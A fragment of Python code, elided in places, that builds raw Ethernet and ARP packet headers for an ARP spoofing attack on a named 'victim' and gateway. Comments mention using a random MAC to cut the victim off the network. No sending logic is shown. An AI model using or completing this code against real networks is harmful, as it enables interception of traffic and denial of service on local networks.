...
# if want to disassociate the victim
# just use a random MAC

gatemac = '\x00\x50\x56\xC0\x00\x08'
code ='\x08\x06' # code for arp protocol
eth1 = victmac+sor+code #for victim
eth2 = gatemac+sor+code # for gateway

htype = '\x00\x01' #ethernet
...
gip = socket.inet_aton ( gate_ip ) # convert to hex
